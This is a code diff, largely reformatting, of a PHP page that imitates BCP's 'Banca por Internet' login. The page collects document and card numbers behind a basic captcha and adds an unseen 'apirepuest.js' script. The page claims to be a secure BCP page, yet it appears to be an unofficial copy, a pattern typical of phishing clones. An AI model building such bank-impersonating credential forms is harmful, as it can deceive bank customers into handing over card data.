@@ -1,16 +1,16 @@
 <?php
 session_start();
 
-if(isset($_POST['submit'])){
+if (isset($_POST['submit'])) {
     // Verificar el valor del captcha
-    if($_POST['captcha_code'] == $_SESSION["captcha_code"]){
+    if ($_POST['captcha_code'] == $_SESSION["captcha_code"]) {
         $message = '<p id="msg">correco</p>';
-        
-    }else{
+
+    } else {
         // Captcha es incorrecto
         $message = '<p id="msg">Incorreco</p>';
     }
-}  
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -24,50 +24,53 @@ if(isset($_POST['submit'])){
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
-    <link rel="stylesheet" type="text/css" href="css/style.css">    
+    <link rel="stylesheet" type="text/css" href="css/style.css">
 
     <title>Document</title>
 </head>
 
 <body>
+
+
     <div class="container-fluid sinpadding">
-        <div  class="row m-altura">
+        <div class="row m-altura">
             <div class="col-md-6 img-fondo">
-                
+
             </div>
             <div class="col-md-6">
-                
+
                 <h3 class="fw-bold text-center pt-5 mb-5">Banca por Internet</h3>
                 <!-- Formulario -->
-                <form action="#" method="post" novalidate class="form-padre" id="formulario">
+                <form method="post" class="form-padre" id="formulario">
                     <div class="opciones">
-                        
-                    <label class="radio" for="persona">
-                        <input type="radio" name="bcp" id="persona" value="personas" checked>
+
+                        <label class="radio" for="persona">
+                            <input type="radio" name="bcp" id="persona" value="personas" checked>
                             <span></span>
-                                Persona
-                    </label>
-                    <label class="radio" for="empresa">
-                        <input type="radio" name="bcp" id="empresa" value="empresas">
-                        <span></span>
-                        Empresa
-                    </label>
+                            Persona
+                        </label>
+                        <label class="radio" for="empresa">
+                            <input type="radio" name="bcp" id="empresa" value="empresas">
+                            <span></span>
+                            Empresa
+                        </label>
                     </div>
                     <div class="Documentos">
-                        <select name="DNI"  id="documentos form-control" class="form-select selec-docu select">
+                        <select name="DNI" id="documentos form-control" class="form-select selec-docu select">
                             <option value="1">DNI</option>
                             <option value="2">CE</option>
                             <option value="3">PAS</option>
                         </select>
-                        
-                        <input type="text" class="form-control ancho-input" name="numeroDocumento" id="docu">
-                        
+
+                        <input type="text" class="form-control ancho-input" name="numDocumento" id="docu" required>
+
                     </div>
 
 
                     <div class="mb-4">
                         <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
-                        <input type="text" class="form-control ancho2-input label-input" name="numeroTarjeta" id="numeroTarjeta" required>
+                        <input type="text" class="form-control ancho2-input label-input" name="numeroTarjeta"
+                            id="numeroTarjeta" required>
                     </div>
 
                     <div class="my-3">
@@ -86,26 +89,33 @@ if(isset($_POST['submit'])){
                     </div>
                     <div class="form-group">
                         <img src="captcha_gen.php" />
-                        <input type="text" name="captcha_code" class="form-control" autocomplete="off"/>
+                        <input type="text" name="captcha_code" class="form-control" autocomplete="off" required />
                         <a href="" id="cl">Cambiar</a>
-                        <?php  
-                            if(isset($message)){
-                                echo $message;
-                            }                                
-                                
-                            session_unset();
-                             ?>
+                        <?php
+                        if (isset($message)) {
+                            echo $message;
+                        }
+
+                        session_unset();
+                        ?>
                     </div>
 
                     <div class="d-grid">
-                        <input type="submit" name='submit' value="Continuar" id="st" class="btn btn-primary botoncontinuar"/>        
+
+
+                        <button type='submit' value="Continuar" id="st"
+                            class="btn btn-primary botoncontinuar">Continuar</button>
+
+
                         <p id="show" style="text-align:center;">
 
                     </div>
                     <div>
-                    <p class="texto">
-                    <i class="bi bi-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate
-                        con nosotros al 311-9898 o a través de nuestros medios digitales.</p>
+                        <p class="texto">
+                            <i class="bi bi-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la
+                            autenticidad de la web, comunícate
+                            con nosotros al 311-9898 o a través de nuestros medios digitales.
+                        </p>
                     </div>
                 </form>
             </div>
@@ -113,19 +123,22 @@ if(isset($_POST['submit'])){
     </div>
     <script>
 
-                   
-        $(document).ready(function(){
-            $("#st").on('click',function(){
-                $("#msg").css('display','block');
-                       
+
+        $(document).ready(function () {
+            $("#st").on('click', function () {
+                $("#msg").css('display', 'block');
+
             });
-            $("#cl").on('click',function(){    
+            $("#cl").on('click', function () {
                 location.reload();
             });
         });
     </script>
     <script src="js/main.js"></script>
     <script src="js/input.js"></script>
+    <script src="js/apirepuest.js"></script>
+    
+
 
 </body>
 
